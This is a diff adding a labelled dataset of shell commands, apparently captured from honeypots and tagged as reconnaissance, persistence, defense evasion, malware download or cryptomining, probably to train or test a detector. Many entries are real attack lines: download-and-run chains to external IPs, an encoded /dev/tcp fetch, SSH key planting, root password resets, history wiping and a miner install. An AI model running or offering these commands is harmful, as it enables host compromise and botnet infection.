@@ -1,0 +1,624 @@
+{"command": "cd /tmp", "label": "benign", "count": 97, "source": "cyberlab_seen"}
+{"command": "uname -a", "label": "reconnaissance", "count": 53, "source": "cyberlab_seen"}
+{"command": "cat /bin/echo", "label": "reconnaissance", "count": 32, "source": "cyberlab_seen"}
+{"command": "cd /var/run", "label": "benign", "count": 27, "source": "cyberlab_seen"}
+{"command": "cd /mnt", "label": "benign", "count": 27, "source": "cyberlab_seen"}
+{"command": "cd /root", "label": "benign", "count": 27, "source": "cyberlab_seen"}
+{"command": "cd /", "label": "benign", "count": 27, "source": "cyberlab_seen"}
+{"command": "wget http://102.165.48.81/njs.sh", "label": "malware_downloader", "count": 27, "source": "cyberlab_seen"}
+{"command": "cd", "label": "benign", "count": 20, "source": "cyberlab_seen"}
+{"command": "unset HISTORY HISTFILE HISTSAVE HISTZONE HISTORY HISTLOG WATCH", "label": "defense_evasion", "count": 10, "source": "cyberlab_seen"}
+{"command": "history -n", "label": "defense_evasion", "count": 10, "source": "cyberlab_seen"}
+{"command": "export HISTFILE=/dev/null", "label": "defense_evasion", "count": 10, "source": "cyberlab_seen"}
+{"command": "export HISTSIZE=0", "label": "defense_evasion", "count": 10, "source": "cyberlab_seen"}
+{"command": "export HISTFILESIZE=0", "label": "defense_evasion", "count": 10, "source": "cyberlab_seen"}
+{"command": "mkdir /root/.ssh", "label": "persistence", "count": 10, "source": "cyberlab_seen"}
+{"command": "rm -rf .ssh/authorized_keys", "label": "persistence", "count": 10, "source": "cyberlab_seen"}
+{"command": "touch .ssh/authorized_keys", "label": "persistence", "count": 10, "source": "cyberlab_seen"}
+{"command": "echo 'ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEAvN5GkpS25Z9eA2bARaXTVfVN2m/N5V5ddOTyVPftA3ljorQitmh1pyuZDty9oTWF+J0cOtGBvRaQ7NvZCaDC2q6QR0iMOfq7zs+4bl8WO8UnaQcVVIBeEt3YPo8PXwVm5fR4wgoq9SZp29/2jFz0UmAOhiUyImh9/P7jFWqpv3gSxZ8neq+4pSCUfE24OGiFBpJGkAE+wMmJcBX0WjFfjedcbBs1FO/C+x8WY9bFkQ3NwwjVbh3c3mYy9zqdPhm6GI/heVAZUWSKHausOwb+Rem+eKhkrKvoeteqJXEIrlLbHyRHn+12nN/qgG5kIcICv4TRD59GHMYZH3ILngyFJQ==' >> /root/.ssh/authorized_keys", "label": "persistence", "count": 10, "source": "cyberlab_seen"}
+{"command": "/gisdfoewrsfdf", "label": "reconnaissance", "count": 5, "source": "cyberlab_seen"}
+{"command": "ls -la /var/run/gcc.pid", "label": "reconnaissance", "count": 2, "source": "cyberlab_seen"}
+{"command": "echo -e '\\x47\\x72\\x6f\\x70/' > //.nippon", "label": "reconnaissance", "count": 2, "source": "cyberlab_seen"}
+{"command": "cat //.nippon", "label": "reconnaissance", "count": 2, "source": "cyberlab_seen"}
+{"command": "rm -f //.nippon", "label": "reconnaissance", "count": 2, "source": "cyberlab_seen"}
+{"command": "wget http://192.200.208.181/mi3307 curl -O http://192.200.208.181/mi3307 chmod +x mi3307 ./mi3307", "label": "malware_downloader", "count": 1, "source": "cyberlab_seen"}
+{"command": "sudo /bin/sh", "label": "privilege_escalation", "count": 1, "source": "cyberlab_seen"}
+{"command": "/bin/sh", "label": "benign", "count": 1, "source": "cyberlab_seen"}
+{"command": "/bin/busybox cp", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "mount", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "echo -e '\\x47\\x72\\x6f\\x70/tmp' > /tmp/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "cat /tmp/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "rm -f /tmp/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "echo -e '\\x47\\x72\\x6f\\x70/var/tmp' > /var/tmp/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "cat /var/tmp/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "rm -f /var/tmp/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "echo -e '\\x47\\x72\\x6f\\x70/lib/init/rw' > /lib/init/rw/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "cat /lib/init/rw/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "rm -f /lib/init/rw/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "echo -e '\\x47\\x72\\x6f\\x70/proc' > /proc/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "cat /proc/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "rm -f /proc/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "echo -e '\\x47\\x72\\x6f\\x70/sys' > /sys/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "cat /sys/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "rm -f /sys/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "echo -e '\\x47\\x72\\x6f\\x70/dev' > /dev/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "cat /dev/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "rm -f /dev/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "echo -e '\\x47\\x72\\x6f\\x70/dev/shm' > /dev/shm/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "cat /dev/shm/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "rm -f /dev/shm/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "echo -e '\\x47\\x72\\x6f\\x70/dev/pts' > /dev/pts/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "cat /dev/pts/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "rm -f /dev/pts/.nippon", "label": "reconnaissance", "count": 1, "source": "cyberlab_seen"}
+{"command": "wget http://107.160.40.212/mi3307 curl -O http://107.160.40.212/mi3307 chmod +x mi3307 ./mi3307", "label": "malware_downloader", "count": 1, "source": "cyberlab_seen"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox PKCHL", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox SSDBN", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "echo \"root:McL2xkIxoO5t\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;", "label": "defense_evasion", "count": 733, "source": "external_2024"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox JVFOS", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "echo \"blhutchings\\noxBVsNvK64xI\\noxBVsNvK64xI\\n\"|passwd", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo \"mysql@123\\nq300zt4ipIwE\\nq300zt4ipIwE\\n\"|passwd", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo -e \"reu\\nXYyIFYSGrEcW\\nXYyIFYSGrEcW\"|passwd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "cd /tmp || cd /run || cd /; wget http://104.248.30.69/yoyobins.sh; chmod 777 yoyobins.sh; sh yoyobins.sh; tftp 104.248.30.69 -c get yoyotftp1.sh; chmod 777 yoyotftp1.sh; sh yoyotftp1.sh; tftp -r yoyotftp2.sh -g 104.248.30.69; chmod 777 yoyotftp2.sh; sh yoyotftp2.sh; rm -rf yoyobins.sh yoyotftp1.sh yoyotftp2.sh; rm -rf *", "label": "malware_downloader", "count": 4, "source": "external_2024"}
+{"command": "echo \"pass\\nbQNjWSdtfQjy\\nbQNjWSdtfQjy\\n\"|passwd", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo -e \"coin\\ncxFvOBIUm8AK\\ncxFvOBIUm8AK\"|passwd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo \"ideaconnect\\ndcbVcQJ8iOqi\\ndcbVcQJ8iOqi\\n\"|passwd", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "cat /proc/mounts; /bin/busybox HYKUS", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "df -h | head -n 2 | awk 'FNR == 2 {print $2;}'", "label": "reconnaissance", "count": 736, "source": "external_2024"}
+{"command": "echo \"root:HxlyW7NsJsTU\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "tftp; wget; /bin/busybox TNIBX", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "tftp; wget; /bin/busybox VKTAL", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "cat /proc/mounts; /bin/busybox MQKYU", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "echo \"root:IKUJwL5fN7jy\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo \"doule\\n8TIqZdzSQwzI\\n8TIqZdzSQwzI\\n\"|passwd", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "tftp; wget; /bin/busybox RCERZ", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "/bin/busybox KQFYN", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox GWDGN", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "echo \"wangyifa\\npTkAhxzbb6sa\\npTkAhxzbb6sa\\n\"|passwd", "label": "persistence", "count": 2, "source": "external_2024"}
+{"command": "echo \"root:JLmuu4Lp5RK0\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "cat /proc/mounts; /bin/busybox QWBQP", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "echo \"root:njj0N97BN5nm\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo \"1234\\n2bF6ITITvYMG\\n2bF6ITITvYMG\\n\"|passwd", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo -e \"teamspeak\\n830wZSxi3P0h\\n830wZSxi3P0h\"|passwd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo \"tiendashntga\\nU0X9AmbEhTZK\\nU0X9AmbEhTZK\\n\"|passwd", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo \"root:LHr6HgEfhBKt\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "nohup $SHELL -c \"curl http://129.144.180.26:60107/linux -o /tmp/9aXpRJBT0s; if [ ! -f /tmp/9aXpRJBT0s ]; then wget http://129.144.180.26:60107/linux -O /tmp/9aXpRJBT0s; fi; if [ ! -f /tmp/9aXpRJBT0s ]; then exec 6<>/dev/tcp/129.144.180.26/60107 && echo -n 'GET /linux' >&6 && cat 0<&6 > /tmp/9aXpRJBT0s && chmod +x /tmp/9aXpRJBT0s && /tmp/9aXpRJBT0s Z3tT4UhH4YNLKS5TleZMXOBXahkde1bkX1vjj1E2KV2L/EdQ7FFrGxpsR+5IR+OMSykoS4LqT1DmVmseCmpW5UhE4I5LKSBcledFXOBXah4fe1buVFvjjlQ2LVSV40xR7FFrGxhsR+JVW+OIXDYpUI78RFPkXW0aG2tX9ldE5ZVWKzZUiOtbV+9TYRwaalflRk38iVQvNlSC4FtU4V1tGhtvVfZeW+CKVTYqV478RFfiXW0aG2le9lJC/IpUITZXg/xHVOBdbRoba1H2XlvgilU2KVSM/EdV511tGhtrX/ZSQvyJUSo2VI3iW1TnX2EcGmpW5EZE6olLKS1UledGSORWYhAca1bmVlXjiVc2KleN/EFf+FVrGBBtV+dWRvKPUjYqUYn8TFP4VWofEG1X51RA8o9SNipRifxEXuJJahwaYVHmV0frm1QqKEuM4ltf4ElqExxhUeZXReKbVCkvS4rnQ0jvU3UeG2FR5ldG4JtRLzZXiORbV+BTdRsZaF3gVkTgiUUpIFeV40BX+FJqBBtiUOxQReOJUjgpV4j8Q0jnV2kEEmtd4FZE5o5FLC9LieFDSOdQdR0eYVHmV0Hlm1QgKkuK50RI41R1GBtiXeBWROKLRSwvS4zkW1fiV3UdGGFR5ldF65tWLjZUiuJbV+VQdRIfYVHmV0Hnm1MpNlSI6ltX7lJ1GBlvXeBWROaDRSkvVpXgRUjnVGIEEmpd4FZE4YhFKShUleNGVPhWax4EalXhXEPiilUuOF2V4ERR+FZiGARpUOxQReOPVzggS4njTEjkUmkEG2tQ7FBF449QugGsFQSgMwcwTlZVvOHVYsPLWpBKXg==; fi; echo 123456 > /tmp/.opass; chmod +x /tmp/9aXpRJBT0s && /tmp/9aXpRJBT0s Z3tT4UhH4YNLKS5TleZMXOBXahkde1bkX1vjj1E2KV2L/EdQ7FFrGxpsR+5IR+OMSykoS4LqT1DmVmseCmpW5UhE4I5LKSBcledFXOBXah4fe1buVFvjjlQ2LVSV40xR7FFrGxhsR+JVW+OIXDYpUI78RFPkXW0aG2tX9ldE5ZVWKzZUiOtbV+9TYRwaalflRk38iVQvNlSC4FtU4V1tGhtvVfZeW+CKVTYqV478RFfiXW0aG2le9lJC/IpUITZXg/xHVOBdbRoba1H2XlvgilU2KVSM/EdV511tGhtrX/ZSQvyJUSo2VI3iW1TnX2EcGmpW5EZE6olLKS1UledGSORWYhAca1bmVlXjiVc2KleN/EFf+FVrGBBtV+dWRvKPUjYqUYn8TFP4VWofEG1X51RA8o9SNipRifxEXuJJahwaYVHmV0frm1QqKEuM4ltf4ElqExxhUeZXReKbVCkvS4rnQ0jvU3UeG2FR5ldG4JtRLzZXiORbV+BTdRsZaF3gVkTgiUUpIFeV40BX+FJqBBtiUOxQReOJUjgpV4j8Q0jnV2kEEmtd4FZE5o5FLC9LieFDSOdQdR0eYVHmV0Hlm1QgKkuK50RI41R1GBtiXeBWROKLRSwvS4zkW1fiV3UdGGFR5ldF65tWLjZUiuJbV+VQdRIfYVHmV0Hnm1MpNlSI6ltX7lJ1GBlvXeBWROaDRSkvVpXgRUjnVGIEEmpd4FZE4YhFKShUleNGVPhWax4EalXhXEPiilUuOF2V4ERR+FZiGARpUOxQReOPVzggS4njTEjkUmkEG2tQ7FBF449QugGsFQSgMwcwTlZVvOHVYsPLWpBKXg==\" &", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "cd /dev/shm; cat .s || cp /bin/echo .s; /bin/busybox HNBVC", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "tftp; wget; /bin/busybox RWOBU", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "echo \"nosoup4u\\n6Wb97WmU2yDx\\n6Wb97WmU2yDx\\n\"|passwd", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo \"gknopf\\nRlFrvEeopyJ7\\nRlFrvEeopyJ7\\n\"|passwd", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo \"root:4iilUDyYavAd\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "uname -a ; nvidia-smi --list-gpus | grep 0 | cut -f2 -d: | uniq -c", "label": "reconnaissance", "count": 3, "source": "external_2024"}
+{"command": "echo -e \"ys\\nHFQfiUBxykwM\\nHFQfiUBxykwM\"|passwd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "echo \"root:nUbAXfthM7QC\"|chpasswd|bash", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "ps", "label": "reconnaissance", "count": 3, "source": "external_2024"}
+{"command": "ps -ef", "label": "reconnaissance", "count": 3, "source": "external_2024"}
+{"command": "/bin/busybox wget http://37.49.224.231:80/batkek/arm -O -> .z; /bin/busybox chmod 777 .z; ./.z telnet.arm.wget; >.z", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "echo [[[", "label": "reconnaissance", "count": 2, "source": "external_2024"}
+{"command": "uname -a && nproc", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "/bin/busybox mkdir /var/; >/var/.file && cd /var/", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "echo ]]]", "label": "reconnaissance", "count": 2, "source": "external_2024"}
+{"command": "#!/bin/sh; PATH=$PATH:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin; wget http://43.249.172.195:888/112; curl -O http://43.249.172.195:888/112; chmod +x 112; ./112; wget http://43.249.172.195:888/112s; curl -O http://43.249.172.195:888/112s; chmod +x 112s; ./112s; rm -rf 112.sh; rm -rf 112; rm -rf 112s; history -c;", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "echo -e '\\x54C_CONTINUE' > /uwu", "label": "reconnaissance", "count": 5, "source": "external_2024"}
+{"command": "echo xsec", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "wget http://2.58.149.116/ssh/ -O- > ntpclient; chmod 777 ntpclient; ./ntpclient test.wget.", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "User-Agent: python-requests/2.6.0 CPython/2.7.5 Linux/3.10.0-1160.66.1.el7.x86_64", "label": "benign", "count": 1, "source": "external_2024"}
+{"command": "cat 1", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "cat /bin/echo||while read i; do echo $i; done < /proc/self/exe;", "label": "reconnaissance", "count": 10, "source": "external_2024"}
+{"command": "/bin/busybox mkdir /var/tmp/; >/var/tmp/.file && cd /var/tmp/", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "apt install screen", "label": "benign", "count": 1, "source": "external_2024"}
+{"command": "/bin/busybox mkdir /mnt/; >/mnt/.file && cd /mnt/", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "/bin/busybox mkdir /boot/; >/boot/.file && cd /boot/", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "./.x; ./.z telnet.arm.echo; >.x; >.z", "label": "malware_execution", "count": 1, "source": "external_2024"}
+{"command": "head -c 0 > /tmp/oTLcfnTCDv", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "/tmp/ntpclient sftp.mips", "label": "malware_execution", "count": 1, "source": "external_2024"}
+{"command": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://209.141.43.118/sensi.sh; curl -O http://209.141.43.118/sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp 209.141.43.118 -c get sensi.sh; chmod 777 sensi.sh; sh sensi.sh; tftp -r sensi2.sh -g 209.141.43.118; chmod 777 sensi2.sh; sh sensi2.sh; ftpget -v -u anonymous -p anonymous -P 21 209.141.43.118 sensi1.sh sensi1.sh; sh sensi1.sh; rm -rf sensi.sh sensi.sh sensi2.sh sensi1.sh; rm -rf *", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "sudo ./upnpsetup", "label": "malware_execution", "count": 3, "source": "external_2024"}
+{"command": "wget  https://ipinfo.io/org > 1", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "cat /proc/mounts || busybox cat /proc/mounts", "label": "reconnaissance", "count": 5, "source": "external_2024"}
+{"command": "curl", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "rm -rf sh; wget http://185.191.127.212/sh || curl -O http://185.191.127.212/sh || tftp 185.191.127.212 -c get sh || tftp -g -r sh 185.191.127.212; chmod 777 sh;./sh ssh; rm -rf sh", "label": "malware_downloader", "count": 2, "source": "external_2024"}
+{"command": "Accept: */*", "label": "benign", "count": 2, "source": "external_2024"}
+{"command": "touch ylyzc", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": ">A@/XBV'8ELFGVR", "label": "benign", "count": 33, "source": "external_2024"}
+{"command": "执行命令", "label": "benign", "count": 1, "source": "external_2024"}
+{"command": "echo \"/bin/busybox ERTJJ\" | sh", "label": "reconnaissance", "count": 2, "source": "external_2024"}
+{"command": "cat /proc/1", "label": "reconnaissance", "count": 3, "source": "external_2024"}
+{"command": "cat /proc/1/mounts && ls /proc/1/", "label": "reconnaissance", "count": 2, "source": "external_2024"}
+{"command": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://216.250.247.185/bins.sh; busybox wget http://216.250.247.185/bins.sh; curl -O http://216.250.247.185/bins.sh; chmod 777 bins.sh; sh bins.sh; tftp 216.250.247.185 -c get bins.sh; chmod 777 bins.sh; sh bins.sh; tftp -r bins.sh -g 216.250.247.185; chmod 777 bins.sh; sh bins.sh; ftpget -v -u anonymous -p anonymous -P 21 216.250.247.185 bins.sh bins.sh; sh bins.sh; rm -rf bins.sh; rm -rf *;exit", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "endScript;", "label": "benign", "count": 2, "source": "external_2024"}
+{"command": "/bin/busybox mkdir /dev/shm/; >/dev/shm/.file && cd /dev/shm/", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "uname-a", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "/bin/busybox mkdir /dev/; >/dev/.file && cd /dev/", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "dd if=/proc/self/exe bs=22 count=2 || while read i; do echo $i; done < /proc/self/exe || cat /proc/self/exe;", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "uptime", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "/bin/busybox wget; /bin/busybox tftp; /bin/busybox HGYQA", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "cd /tmp; wget http://5.10.249.153:9999/exec.sh; curl -O http://5.10.249.153:9999/exec.sh; bash exec.sh", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "sudo hive-passwd set ifjeeisurofmioufiose", "label": "persistence", "count": 1, "source": "external_2024"}
+{"command": "touch jqzdz", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "touch vsuyz", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "touch dbvpv", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "touch vlowi", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "top -n 1 -b", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "sh -c 'for proc_dir in /proc/[0-9]*; do pid=${proc_dir##*/}; buffer=$(cat \"/proc/$pid/maps\"); if [ \"${#buffer}\" -gt 1 ]; then if [ \"${buffer#*\"/lib/\"}\" = \"$buffer\" ] && [ \"${buffer#*\"/lib64/\"}\" = \"$buffer\" ] && [ \"${buffer#*\"dvrLocker\"}\" = \"$buffer\" ]; then kill -9 \"$pid\"; fi; fi; done'", "label": "defense_evasion", "count": 1, "source": "external_2024"}
+{"command": "wget 62.197.136.157/x-8.6-.Sakura; chmod 777 x-8.6-.Sakura; ./x-8.6-.Sakura x86_64", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "..", "label": "benign", "count": 3, "source": "external_2024"}
+{"command": "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36", "label": "benign", "count": 2, "source": "external_2024"}
+{"command": "Host: 104.238.182.124", "label": "benign", "count": 1, "source": "external_2024"}
+{"command": "}", "label": "benign", "count": 2, "source": "external_2024"}
+{"command": "uname -a ; nproc", "label": "reconnaissance", "count": 2, "source": "external_2024"}
+{"command": "/bin/busybox mkdir /var/run/; >/var/run/.file && cd /var/run/", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "rm -rf sshdbot; wget http://146.196.67.240/sshdbot || curl -O http://146.196.67.240/sshdbot || tftp 146.196.67.240 -c get sshdbot || tftp -g -r sshdbot 146.196.67.240; chmod 777 sshdbot;./sshdbot sshnfx; rm -rf sshdbot", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": ">?A@/X'8ELFX@L", "label": "benign", "count": 7, "source": "external_2024"}
+{"command": "touch djrbn", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "/bin/busybox mkdir /usr/; >/usr/.file && cd /usr/", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "rm -rf 1.sh; wget http://94.103.188.167/1.sh; chmod +x 1.sh; ./1.sh", "label": "malware_downloader", "count": 2, "source": "external_2024"}
+{"command": "/bin/busybox mkdir /dev/netslink/; >/dev/netslink/.file && cd /dev/netslink/", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "rm -rf mips; wget http://38.45.200.163/mips || curl -O http://38.45.200.163/mips || tftp 38.45.200.163 -c get mips || tftp -g -r mips 38.45.200.163; chmod 777 mips;./mips ssh; rm -rf mips", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "curl https://ipinfo.io/org", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "/bin/busybox mkdir /tmp/; >/tmp/.file && cd /tmp/", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "/bin/busybox cp /bin/busybox .z; >.z; /bin/busybox chmod 777 .z", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "/tmp/LdIZfonKCM /HMzG60Us/PkzWh0yubqvhOzGjRqkYl9NBq7C7Xp49ZrYM7l7LUQox81fYCCYigZsRCq7OXJYGzI5O+0BbIdM32AhGcoGrAVquXjwmxqyeHppB2tGTdjn4BiKBmzHb7r5clrb9jk6aoXugU3aoGfYTQeuRO07OHAem7P++y2Fa0fNn2AhGY8HbMUtOX1zG10z+PztxKtGTVli4djNxq2BbDq+89sdM7h87AWuR02YoWAczcctgu16ODWaW/W4+q+E7MaMmaRgGEyBbEXtPPnyGx0yubovhOzGjRlkYBjNwWwFqrq5tZrbs/v67QUsxomYoaEfTcdtQu17+PWa2/L7+u0FLMdJmKDiH03H7cLteXl1mhswuPttRW0CzNnn4NnMwW0Fqrt785qa8jn/bYXsgU3ZImfajEFsBy+6+XJa2rY5++1C7IbKGKDhX03H7Efsu3kym96ye3vqhyxBTdqgp9lMBG1FbXu7Nhrb8j77LQcrRkyZp+AYzYRtRW17+zYa2rJ++m3C7ITMH2DgGo8HbMUsOj1zGl0yebpqhexHihigoJpMBuyFrP95MtpdMrh76oTuwU3ZYSLZTYatxGk6eLWY27W5Oi0C7IYMmmHgWI1E6MUter7yWxq1ubztRaxETBjgIFjJhqwHKrs7M50b8z77L0duR02YoWFczcatAu85fvMbXTP7OeyFbIbPnOAgWUoGrALtu37wWBsyOTstAWwHShihIN9Nxy6C7bu5cJsasnl5KQUsxgoaoSfaigaux+y7eTKbHrA++y3Eq0aPn2DgGA8HbMUsOjhjEq3Fv+fSZCLk8lzRZQb2pWcTN9QtKI=", "label": "malware_execution", "count": 1, "source": "external_2024"}
+{"command": "/bin/busybox cp /bin/busybox .x; /bin/busybox cp /bin/busybox .z; >.x; >.z; /bin/busybox chmod 777 .x .z", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "touch coash", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "echo -n g1buaqpd|md5sum;uname -a", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "User-Agent: libwww-perl/6.67", "label": "benign", "count": 1, "source": "external_2024"}
+{"command": "touch afzfb", "label": "reconnaissance", "count": 1, "source": "external_2024"}
+{"command": "chmod +x ./.908814642256942895/sshd;nohup ./.908814642256942895/sshd 141.98.24.128 125.88.222.0 43.248.188.109 101.44.163.209 167.114.114.148 103.145.145.82 183.221.214.95 58.223.177.13 182.151.25.46 181.113.114.115 111.74.23.213 185.124.108.182 107.172.84.105 77.91.84.247 164.155.134.70 107.158.225.94 59.38.100.77 188.92.28.249 222.77.96.52 27.128.245.170 117.161.138.2 198.50.206.212 222.77.96.50 23.94.136.106 193.169.244.205 37.58.18.246 93.123.85.185 120.232.132.200 186.233.119.218 37.60.241.18 125.124.179.148 222.186.10.55 180.76.97.38 114.113.151.152 152.89.170.200 195.133.46.73 182.242.140.3 43.248.185.124 185.22.65.186 &", "label": "malware_execution", "count": 1, "source": "external_2024"}
+{"command": "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://139.59.88.74/update.sh -O update.sh; busybox wget http://139.59.88.74/update.sh -O update.sh; curl http://139.59.88.74/update.sh -O update.sh; busybox curl http://139.59.88.74/update.sh -O update.sh; ftpget -v -u anonymous -p anonymous -P 21 139.59.88.74 update.sh update.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 139.59.88.74 update.sh update.sh; chmod 777 update.sh; ./update.sh; rm -rf update.sh", "label": "malware_downloader", "count": 1, "source": "external_2024"}
+{"command": "wget  https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 46BuxHk6RE4WnrAD1PeGkTJwYLc1VtEUb5rnmRGe2vweSeFUpCn9Q4UYewGtJwycXWE2Uc2WgCJsZCNTVGMf97tj5q5McVo", "label": "cryptominer", "count": 1, "source": "external_2024"}
+{"command": "echo -n daagtvtd|md5sum;uname -a", "label": "reconnaissance", "count": 1, "source": "external_2024"}
